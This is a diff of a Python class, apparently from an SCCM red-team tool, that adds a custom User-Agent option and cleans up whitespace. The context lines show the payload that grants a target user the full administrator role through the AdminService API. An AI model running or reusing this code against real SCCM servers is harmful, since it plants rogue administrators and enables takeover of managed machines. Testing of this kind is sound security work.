@@ -6,12 +6,15 @@ import json
 
 
 class ADD_ADMIN:
-    def __init__(self, username, password, target_ip, logs_dir):
+    def __init__(self, username, password, target_ip, logs_dir, user_agent):
         self.username = username
         self.password = password
         self.target_ip = target_ip
         self.logs_dir = logs_dir
         self.headers = {'Content-Type': 'application/json; odata=verbose'}
+        self.user_agent = user_agent
+        if (self.user_agent):
+            self.headers['User-Agent'] = self.user_agent
         requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 
@@ -24,23 +27,23 @@ class ADD_ADMIN:
         self.targetuser = targetuser
         self.targetsid = targetsid
 
-        body = {"LogonName": f"{self.targetuser}", 
+        body = {"LogonName": f"{self.targetuser}",
             "AdminSid":f"{self.targetsid}",
-            "Permissions":[{"CategoryID": "SMS00ALL", 
-                            "CategoryTypeID": 29, 
+            "Permissions":[{"CategoryID": "SMS00ALL",
+                            "CategoryTypeID": 29,
                             "RoleID":"SMS0001R",
                             },
                             {"CategoryID": "SMS00001",
-                            "CategoryTypeID": 1, 
-                            "RoleID":"SMS0001R", 
+                            "CategoryTypeID": 1,
+                            "RoleID":"SMS0001R",
                             },
-                            {"CategoryID": "SMS00004", 
-                            "CategoryTypeID": 1, 
+                            {"CategoryID": "SMS00004",
+                            "CategoryTypeID": 1,
                             "RoleID":"SMS0001R",
                             }],
             "DisplayName":f"{self.targetuser}"
             }
-        
+
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin/"
 
         try:
@@ -103,7 +106,7 @@ class ADD_ADMIN:
                 logger.info(r.status_code)
         except Exception as e:
                 print(e)
-        
+
     def show_admins(self):
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin?$select=LogonName"
         try:
@@ -123,9 +126,9 @@ class ADD_ADMIN:
                 logger.info(r.text)
                 logger.info(r.status_code)
         except Exception as e:
-                print(e)  
-        
-        
+                print(e)
+
+
          # adminid = value[adminid]
          #lookup sccm admin with provided args
 
